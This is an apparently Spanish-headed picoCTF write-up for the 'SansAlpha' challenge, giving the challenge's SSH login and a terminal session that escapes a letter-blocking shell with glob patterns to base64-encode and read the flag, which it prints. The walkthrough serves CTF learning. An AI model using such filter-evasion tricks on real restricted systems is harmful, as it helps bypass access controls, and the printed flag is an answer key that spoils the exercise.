## Descripción

The Multiverse is within your grasp! Unfortunately, the server that contains the secrets of the multiverse is in a universe where keyboards only have numbers and (most) symbols.`ssh -p 57499 ctf-player@mimas.picoctf.net`Use password: `1db87a14`

## Solución
```
┌──(kali㉿kali)-[~/SansAlpha]
└─$ ssh -p 57499 ctf-player@mimas.picoctf.net
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
ctf-player@mimas.picoctf.net's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1016-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

SansAlpha$ ls
SansAlpha: Unknown character detected
SansAlpha$ cat
SansAlpha: Unknown character detected
SansAlpha$ *
bash: blargh: command not found

SansAlpha$ */*
bash: blargh/flag.txt: Permission denied

SansAlpha$ /*
bash: /bin: Is a directory

SansAlpha$ /*/???
E: Invalid operation /bin/awk

SansAlpha$ /*/??????
/bin/base32: extra operand '/bin/base64'
Try '/bin/base32 --help' for more information.

SansAlpha$ /*/????64 */*
/bin/base64: extra operand '/bin/x86_64'
Try '/bin/base64 --help' for more information.

SansAlpha$ /*/???[!_]64 */*
/bin/base64: extra operand 'blargh/flag.txt'
Try '/bin/base64 --help' for more information.

SansAlpha$ /*/???[!_]64 */*
/bin/base64: extra operand 'blargh/flag.txt'
Try '/bin/base64 --help' for more information.

SansAlpha$ /*/???[!_]64 */????.*
cmV0dXJuIDAgcGljb0NURns3aDE1X211MTcxdjNyNTNfMTVfbTRkbjM1NV80OTQ1NjMwYX0=

SansAlpha$ exit
Connection to mimas.picoctf.net closed.
                                                                                                                                                           
┌──(kali㉿kali)-[~/SansAlpha]
└─$ echo cmV0dXJuIDAgcGljb0NURns3aDE1X211MTcxdjNyNTNfMTVfbTRkbjM1NV80OTQ1NjMwYX0= | base64 -d

return 0 picoCTF{7h15_mu171v3r53_15_m4dn355_4945630a}       
```